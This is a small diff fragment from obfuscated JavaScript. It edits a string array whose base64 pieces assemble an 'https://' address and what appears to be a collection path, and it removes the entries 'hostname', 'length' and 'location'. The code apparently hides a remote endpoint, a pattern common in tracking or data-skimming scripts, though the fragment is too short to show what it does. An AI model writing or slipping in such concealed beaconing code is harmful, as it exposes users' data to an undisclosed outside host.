@@ -62,9 +62,6 @@
           _0x3bddf8(0xd3),
           _0x3bddf8(0xeb),
           "aHR0cHM6Ly" + _0x3bddf8(0xdc) + _0x3bddf8(0xd4) + _0x3bddf8(0xc2),
-          "hostname",
-          "length",
-          "location",
           _0x3bddf8(0xe4) + "93bGNvbGxl" + _0x3bddf8(0xd2),
         ];
       (function (_0x4f892d, _0x42857b) {
